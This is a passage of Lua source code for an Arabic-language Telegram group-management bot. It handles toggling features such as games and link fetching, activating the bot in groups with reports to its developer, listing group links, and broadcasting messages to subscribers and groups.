if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الالعاب بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الالعاب بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:Games'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب المتطوره' and Manager(msg) and ChCheck(msg) or text == 'تفعيل الالعاب الاحترافيه' and Manager(msg) and ChCheck(msg) then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الالعاب المتطوره بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Lock:Gamesinline'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب المتطوره' and Manager(msg) and ChCheck(msg) or text == 'تعطيل الالعاب الاحترافيه' and Manager(msg) and ChCheck(msg) then  
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الالعاب المتطوره بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Lock:Gamesinline'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" and ChCheck(msg) or text == "تفعيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل جلب رابط المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" and ChCheck(msg) or text == "تعطيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل جلب رابط المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
if text == "تعطيل الرابط انلاين" and ChCheck(msg) or text == "تعطيل جلب الرابط انلاين" and ChCheck(msg) then 
if Admin(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل جلب رابط انلاين المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
if text == "تفعيل الرابط انلاين" and ChCheck(msg) or text == "تفعيل جلب الرابط انلاين" and ChCheck(msg) then 
if Admin(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل جلب رابط انلاين المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
if text and (text == "تفعيل حذف الردود" or text == "تفعيل مسح الردود") and ChCheck(msg) then 
if not aMeRConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل حذف ردود المدير'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:GpRd"..msg.chat_id_)
return false  
end
end
if text and (text == "تعطيل حذف الردود" or text == "تعطيل مسح الردود") and ChCheck(msg) then 
if not aMeRConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل حذف ردود المدير'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
if text and (text == "تفعيل اضف رد" or text == "تفعيل اضافه رد" or text == "تفعيل حذف رد" or text == "تفعيل حذف رد عام" or text == "تفعيل اضف رد عام") and ChCheck(msg) then 
if not aMeRConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل اضف رد'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:Rd"..msg.chat_id_)
return false  
end
end
if text and (text == "تعطيل اضف رد" or text == "تعطيل اضافه رد" or text == "تعطيل حذف رد" or text == "تعطيل حذف رد عام" or text == "تعطيل اضف رد عام") and ChCheck(msg) then 
if not aMeRConstructor(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل اضف رد'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
if text == "تعطيل الكيبورد" and ChCheck(msg) then 
if aMeRConstructor(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الكيبورد المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:Key"..msg.chat_id_,"ok")
return false  
end
end
if text == "تفعيل الكيبورد" and ChCheck(msg) then 
if aMeRConstructor(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الكيبورد المجموعه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:Key"..msg.chat_id_)
return false  
end
end
--     Source LanZo     --
if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevaMeR:get(LanZo..'aMeR:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevaMeR:get(LanZo..'aMeR:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,aMeR) 
local admins = aMeR.members_
for i=0 , #admins do
if aMeR.members_[i].bot_info_ == false and aMeR.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevaMeR:sadd(LanZo..'aMeR:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if aMeR.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevaMeR:sadd(LanZo.."aMeR:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevaMeR:sadd(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevaMeR:srem(LanZo.."aMeR:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevaMeR:srem(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevaMeR:sismember(LanZo..'aMeR:Groups',msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevaMeR:sadd(LanZo.."aMeR:Groups",msg.chat_id_)
if not DevaMeR:get(LanZo..'aMeR:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevaMeR:incrby(LanZo..'aMeR:Sudos'..msg.sender_user_id_,1)
DevaMeR:set(LanZo..'aMeR:SudosGp'..msg.sender_user_id_..msg.chat_id_,"aMeR")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevaMeR:set(LanZo.."aMeR:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(LANZO,"᥀︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevaMeR:sismember(LanZo..'aMeR:Groups',msg.chat_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تعطيل المجموعه "..dp.title_)  
DevaMeR:srem(LanZo.."aMeR:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevaMeR:set(LanZo.."aMeR:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(LANZO,"᥀︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙بواسطة ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end
end,nil)
end,nil)
end
end
--     Source LanZo     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "᥀︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩"
else
LinkGroup = '᥀︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
end
if not Sudo(msg) then
SendText(LANZO,"᥀︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الشخص ↫ "..Name.."\n᥀︙اسم المجموعه ↫ ["..NameChat.."]\n᥀︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n"..LinkGroup.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙الوقت ↫ "..os.date("%I:%M%p").."\n᥀︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
--     Source LanZo     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' or text == '↫ روابط المجموعات ᥀' then
if not aMeRSudo(msg) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
local List = DevaMeR:smembers(LanZo.."aMeR:Groups")
if #List == 0 then
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙لا توجد مجموعات مفعله', 1, 'md')
else
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
local Text = "᥀︙Source LanZo\n᥀︙File Bot Groups\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevaMeR:scard(LanZo.."aMeR:Managers:"..v) or 0
local GroupsAdmins = DevaMeR:scard(LanZo.."aMeR:Admins:"..v) or 0
local Groupslink = DevaMeR:get(LanZo.."aMeR:Groups:Links" ..v)
Text = Text..k.." ↬ ⤈ \n᥀︙Group ID ↬ "..v.."\n᥀︙Group Link ↬ "..(Groupslink or "Not Found").."\n᥀︙Group Managers ↬ "..GroupsManagers.."\n᥀︙Group Admins ↬ "..GroupsAdmins.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
--     Source LanZo     --
if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه خاص ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevaMeR:get(LanZo.."aMeR:Send:Bot"..LanZo) and not aMeRSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevaMeR:setex(LanZo.."aMeR:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevaMeR:get(LanZo.."aMeR:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevaMeR:smembers(LanZo..'aMeR:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
aMeRText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
aMeRText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
aMeRText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
aMeRText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
aMeRText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
aMeRText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
aMeRText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
aMeRText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة "..aMeRText.." بنجاح \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source LanZo     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه عام ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevaMeR:get(LanZo.."aMeR:Send:Bot"..LanZo) and not aMeRSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevaMeR:setex(LanZo.."aMeR:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevaMeR:get(LanZo.."aMeR:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevaMeR:smembers(LanZo..'aMeR:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
aMeRText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
aMeRText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
aMeRText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
aMeRText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
aMeRText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
aMeRText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
aMeRText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
aMeRText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة "..aMeRText.." بنجاح \n᥀︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source LanZo     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه عام بالتوجيه ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevaMeR:get(LanZo.."aMeR:Send:Bot"..LanZo) and not aMeRSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevaMeR:setex(LanZo.."aMeR:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevaMeR:get(LanZo.."aMeR:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevaMeR:smembers(LanZo..'aMeR:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source LanZo     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه خاص بالتوجيه ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevaMeR:get(LanZo.."aMeR:Send:Bot"..LanZo) and not aMeRSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevaMeR:setex(LanZo.."aMeR:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙ارسل الرساله الان لتوجيها \n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevaMeR:get(LanZo.."aMeR:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevaMeR:smembers(LanZo..'aMeR:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙تم اذاعة رسالتك بالتوجيه \n᥀︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevaMeR:del(LanZo.."aMeR:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
--     Source LanZo     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "↫ اذاعه بالتثبيت ᥀" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevaMeR:get(LanZo.."aMeR:Send:Bot"..LanZo) and not aMeRSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevaMeR:setex(LanZo.."aMeR:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n᥀︙للخروج ارسل ↫ ( الغاء ) \n ✓'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
return false
end 
